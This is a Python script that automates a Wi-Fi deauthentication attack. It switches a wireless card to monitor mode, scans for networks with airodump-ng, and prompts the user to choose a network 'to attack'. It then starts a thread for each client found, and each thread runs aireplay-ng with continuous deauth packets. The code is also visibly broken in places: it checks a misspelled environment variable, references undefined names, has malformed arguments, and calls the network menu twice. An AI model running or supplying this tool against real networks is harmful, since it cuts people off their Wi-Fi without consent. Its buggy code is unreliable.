import csv
from datetime import datetime
import os
import re
import shutil
import subprocess
import threading
import time


def sudoCheck():
    if not "SUDO_IUD" in os.environ.keys():
        print("Access denied, Are you root?")
        exit()


def findNic():
    result = subprocess.run(["iw", "dev"], capture_output=True).stdout.decode()
    networkInterfaceControllers = wlan_code.findall(result)
    return networkInterfaceControllers


def setMonitorMode(controllerName):
    subprocess.run(["ip", "link", "set", wifiName, " down"])
    subprocess.run(["airmon-ng", "check", "kill"])
    subprocess.run(["iw", wifiName, "set", "monitor", "none"])
    subprocess.run(["ip", "link", "set", wifiName, "up"])


def setBandToMonitor(choice):
    if choice == "0":
        subprocess.Popen(["airodump-ng", " --band", "bg", "-w", "file", "--write-interval", "1",
                         "output-format", "csv", wifiName], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif choice == "T":
        subprocess.Popen(["airodump-ng", " --band", "bg", "-w", "file", "--write-interval", "1",
                         "output-format", "csv", wifiName], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def backupCsv():
    for fileName in os.listdir():
        if ".csv" in fileName:
            directory = os.getcwd()
            try:
                os.mkdir(directory + "/backup/")
            except:
                print("Backup Folder Exists")
                timestamp = datetime.now()
                shutil.move(fileName, directory + "/backup" +
                            str(timestamp) + "-" + fileName)


def checkForEssid(essid, lst):
    checkStatus = True
    if len(lst) == 0:
        return checkStatus
    for item in lst:
        if essid in item["ESSID"]:
            checkStatus = False
    return checkStatus


def wifiNetworkMenu():
    activeWirelessNetworks = []
    try:
        while True:
            subprocess.call("clear", shell=True)
            for fileName in os.listdir():
                fieldNames = ["BSSID", "First time seen", "Last time seen",
                              "channel", "Speed", "Privacy", "Cipher",]
                if ".csv" in fileName:
                    with open(fileName, "r") as file:
                        reader = csv.DictReader(file, fieldnames=fieldNames)
                        for row in reader:
                            if row["BSSID"] != "BSSID":
                                if checkForEssid(row["BSSID"], activeWirelessNetworks):
                                    activeWirelessNetworks.append(row)
            print("Scanning for wireless networks...")
            for index, network in enumerate(activeWirelessNetworks):
                print(f"{index + 1} - {network['BSSID']}")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n Ready To Make Choice")

    while True:
        try:
            choice = int(
                input("Enter the number of the network you want to attack: "))
            if choice > 0 and choice <= len(activeWirelessNetworks):
                return activeWirelessNetworks[choice - 1]
        except:
            print("Invalid Choice")


def setIntoManagedMode(wifiName):
    subprocess.run(["airmon-ng", "stop", wifiName])
    subprocess.run(["ip", "link", "set", wifiName, "down"])
    # moniter mode
    subprocess.run(["iwconfig", wifiName, "mode", "managed"])
    subprocess.run(["ip", "link", "set", wifiName, "up"])
    subprocess.run(["service", "network-manager", "restart"])


def getClients(hackbssid, hackchannel, wifiName):
    subprocess.Popen(["airodump-ng", "--bssid", hackbssid, "--channel", hackchannel, "-w", "file", "--write-interval",
                     "1", "output-format", "csv", wifiName], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def deauthAttack(networkMac, targetMac, interface):
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a",
                   networkMac, "-c", targetMac, interface])


macAddressRegex = re.compile(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")
wlanCode = re.compile(r"Interface (wlan[0-9])")

sudoCheck()
backupCsv()

macsNotToAttack = []

while True:
    print("Please enter the Mac Address of the network you want to attack")
    mac = input(
        "Please use comma to seperate the list of more than one macAddress: ")
    macsNotToAttack = macAddressRegex.findall(mac)
    macsNotToAttack = [mac.upper() for mac in macsNotToAttack]
    if len(macsNotToAttack) > 0:
        break
    print("Invalid Mac Address")

while True:
    wifiControllerBands = [
        "bg (2.4 GHz)", "a (5 GHz)", "abg (2.4 GHz and 5 GHz)"]
    print("Please select the band you want to monitor")
    for index, controller in enumerate(wifiControllerBands):
        print(f"{index} - {controller}")

    bandChoice = input("Please select the band you want to monitor: ")
    try:
        if wifiControllerBands[int(bandChoice)]:
            bandChoice = int(bandChoice)
            break
    except:
        print("Invalid Choice")


networkControllers = findNic()
if len(networkControllers) == 0:
    print("No wireless network controllers found")
    exit()

while True:
    for index, controller in enumerate(networkControllers):
        print(f"{index} - {controller}")

    controllerChoice = input(
        "Please select the wireless network controller you want to use: ")

    try:
        if networkControllers[int(controllerChoice)]:
            controllerChoice = int(controllerChoice)
            break
    except:
        print("Invalid Choice")

wifiName = networkControllers[int(controllerChoice)]
setMonitorMode(wifiName)
setBandToMonitor(bandChoice)
hackBssid = wifiNetworkMenu()["BSSID"]
hackChannel = wifiNetworkMenu()["channel"]

getClients(hackBssid, hackChannel, wifiName)

actiiveClients = set()
threadsStarted = []

subprocess.run(["airmon-ng", "start", wifiName, hackChannel])
try:
    while True:
        count = 0
        subprocess.run("clear", shell=True)
        for fileName in os.listdir():
            fieldNames = ["Station MAC", "First time seen", "Last time seen",
                          ]
            if ".csv" in fileName and fileName.startswith("clients"):
                with open(fileName) as csv_h:
                    print("Running......")
                    csv_h.seek(0)
                    csvReader = csv.DictReader(csv_h, fieldnames=fieldNames)
                    for index, row in enumerate(csvReader):
                        if index < 5:
                            pass
                        elif row["Station MAC"] in macsNotToAttack:
                            pass
                        else:
                            actiiveClients.add(row["Station MAC"])
            print("Station MAC    ")
            print("----------------")
            for item in actiiveClients:
                print(f"{item}")
                if item not in threadsStarted:
                    threadsStarted.append(item)
                    t = threading.Thread(target=deauthAttack, args=[hackBssid, item, wifiName], daemon=True)
                    t.start()
except KeyboardInterrupt:
    print("\n Stopping Deauth")
    
setIntoManagedMode(wifiName)
